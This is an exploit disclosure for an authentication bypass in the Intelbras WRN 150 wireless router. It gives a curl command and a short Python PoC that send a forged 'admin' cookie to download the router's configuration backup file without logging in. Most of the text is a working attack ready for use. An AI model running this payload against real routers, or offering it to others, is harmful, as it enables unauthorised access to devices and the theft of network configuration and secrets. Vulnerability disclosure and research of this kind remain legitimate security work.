# Exploit Title: Autentication Bypass/Config file download - INTELBRAS WRN
150
# Date: 28/09/2017
# Exploit Author: Elber Tavares
# Vendor Homepage: http://intelbras.com.br/
# Version: Intelbras Wireless N 150 Mbps - WRN 150
# Tested on: kali linux, windows 7, 8.1, 10
For more info:

http://whiteboyz.xyz/authentication-bypass-intelbras-wrn-150.html

URL VULN: http://10.0.0.1/

Download backup file:

Payload: curl --cookie "Cookie=admin:language=pt"
http://10.0.0.1/cgi-bin/DownloadCfg/RouterCfm.cfg



PoC:

#pip install requests
from requests import get

url = "http://10.0.0.1/cgi-bin/DownloadCfg/RouterCfm.cfg"
#url do backup
header = {'Cookie': 'admin:language=pt'}
#setando o cookie no header
r = get(url, headers=header).text
print(r)